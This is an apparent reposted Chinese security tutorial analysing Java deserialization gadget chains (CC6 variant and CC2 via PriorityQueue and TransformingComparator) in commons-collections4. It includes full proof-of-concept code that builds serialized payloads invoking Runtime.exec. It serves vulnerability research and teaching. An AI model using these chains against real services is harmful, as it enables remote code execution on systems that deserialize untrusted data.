---
title: Java安全中commons-collections4包下的两条反序列化链
url: https://buaq.net/go-149029.html
source: unSafe.sh - 不安全
date: 2023-02-13
fetch_date: 2025-10-04T06:27:34.422261
---

# Java安全中commons-collections4包下的两条反序列化链

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/8d9bc8cb06cad2e5b03aa023bda52b78.jpg)

Java安全中commons-collections4包下的两条反序列化链

前言CC2和CC4都是基于org.apache.commons:commons-collections4上的反序列化链子以前的POC修改在这个版本中，cc包上面
*2023-2-12 10:6:0
Author: [xz.aliyun.com(查看原文)](/jump-149029.htm)
阅读量:31
收藏*

---

## 前言

CC2和CC4都是基于`org.apache.commons:commons-collections4`上的反序列化链子

### 以前的POC修改

在这个版本中，cc包上面的LazyMap类的decorate方法没有了，但是也只是把decorate换成了lazyMap

![](https://xzfile.aliyuncs.com/media/upload/picture/20230211200200-e3e20470-aa03-1.png)

尝试将CC6链的POC中的decorate方法换成lazyMap方法

```
package ysoserial.vulndemo;

/**
 * 暂时对JDK没有限制，在高版本的JDK中也可以成功利用
 */

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6_POC {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        //仿照ysoserial中的写法，防止在本地调试的时候触发命令
        Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Class[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
            new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(faketransformers);
        Map innerMap = new HashMap();
        Map outMap = LazyMap.lazyMap(innerMap, transformerChain);

        //实例化
        TiedMapEntry tme = new TiedMapEntry(outMap, "key");
        Map expMap = new HashMap();
        //将其作为key键传入
        expMap.put(tme, "value");

        //remove
        outMap.remove("key");

        //传入利用链
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        //序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        byte[] bytes = barr.toByteArray();
        String encode =Base64.getEncoder().encodeToString(bytes);
        //输出序列化字符串
        System.out.println(encode);

        //反序列化
        byte[] decode = Base64.getDecoder().decode(encode);
        System.out.println(decode);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decode));
        Object o = ois.readObject();
    }
}
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230211200226-f367b71e-aa03-1.png)

成功弹出了计算器，说明以前的链子在CC4.0版本中稍微修改一下就可以使用了，(其他链子自己可以试试，我没试过)

## CC2链子

### PriorityQueue

这个类就是这条链子的入口位置，对比CC4.0版本的包和以前的版本包，这个类在之前没有实现`Serializable`接口，不能进行序列化，但是在CC4.0版本包中，实现了这个接口，可以进行序列化

PriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。

`java.util.PriorityQueue#readObject`方法中

![](https://xzfile.aliyuncs.com/media/upload/picture/20230211200233-f764bdda-aa03-1.png)

将他的所有元素反序列化到`queue`中，调用了`heapify`方法，跟进一下

![](https://xzfile.aliyuncs.com/media/upload/picture/20230211200238-faa1a1f2-aa03-1.png)

这里需要size右移一位之后减去一个1之后需要满足大于等于0才会调用`siftDown`方法

`size`的初始值为0，所以我们最少需要添加2个元素才能满足条件

![](https://xzfile.aliyuncs.com/media/upload/picture/20230211200243-fddb8e50-aa03-1.png)

好的，接下来进入`siftDown`方法

![](https://xzfile.aliyuncs.com/media/upload/picture/20230211200249-0162bd3c-aa04-1.png)

在`comparator`不为null的时候调用`siftDownUsingComparator`

![](https://xzfile.aliyuncs.com/media/upload/picture/20230211200255-04fae816-aa04-1.png)

之后会调用`comparator`的`compare`方法进行比较

### TransformingComparator

在这个类的compare方法中，就调用了transform方法进行转换

![](https://xzfile.aliyuncs.com/media/upload/picture/20230211200301-08619e64-aa04-1.png)

同样也可以发现他的构造方法

可以传入一个Transformer

### POC编写

#### POC1

既然这里调用了transformer方法，我们就可以使用`ChainedTransformer`结合`InvokerTransformer`的方法构造

```
package ysoserial.vulndemo;

/*
    Gadget chain:
        ObjectInputStream.readObject()
            PriorityQueue.readObject()
                PriorityQueue.heapify()
                    PriorityQueue.siftDown()
                        PriorityQueue.siftDownUsingComparator()
                            TransformingComparator.compare()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
 */
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
public class CC2 {
    public static void main(String[] args) throws Exception{
        //创建 ChainedTransformer实例
        Transformer[] faketransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke",
                new Class[] { Object.class, Object[].class },
                new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class },
                new String[] { "calc" }),
        };
        ChainedTransformer chain = new ChainedTransformer(faketransformers);
        //创建TranformingComparator 实例
        Comparator comparator = new TransformingComparator(chain);

        //创建 PriorityQueue 实例
        //readobject 入口
        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field field = chain.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chain,transformers);
        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(priorityQueue);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230211200328-18310b4a-aa04-1.png)

在构造`PriorityQueue`对象的时候第一个参数是有要求的，跟进一下

![](https://xzfile.aliyuncs.com/media/upload/picture/20230211200335-1c6ad6dc-aa04-1.pn...